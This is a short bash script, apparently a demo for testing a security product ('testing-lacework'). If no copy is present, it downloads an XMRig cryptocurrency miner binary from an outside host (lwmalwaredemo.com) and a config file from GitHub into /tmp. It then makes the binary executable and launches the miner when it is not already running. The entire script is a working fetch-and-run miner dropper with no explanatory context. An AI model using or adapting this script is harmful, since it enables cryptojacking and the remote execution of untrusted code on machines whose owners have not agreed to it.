#!/usr/bin/env bash

if [ ! -f /tmp/xmrig-demo ]; then
        echo "[INFO] XMRig not found, downloading XMRig now"
        curl http://lwmalwaredemo.com/xmrig -o /tmp/xmrig-demo
        curl https://raw.githubusercontent.com/renesiekermann/testing-lacework/main/config.json -o /tmp/config-demo.json
        chmod +x /tmp/xmrig-demo
else
        echo "[INFO] XMRig present, skipping download"
fi

if [ $(ps -ef | grep -v grep | grep xmrig-demo | awk '{print $2}'| wc -l) = "0" ]; then
        echo "[INFO] XMRig not running, starting now"
        /tmp/xmrig-demo -c /tmp/config-demo.json
else
        echo "[INFO] XMRig already running"
fi
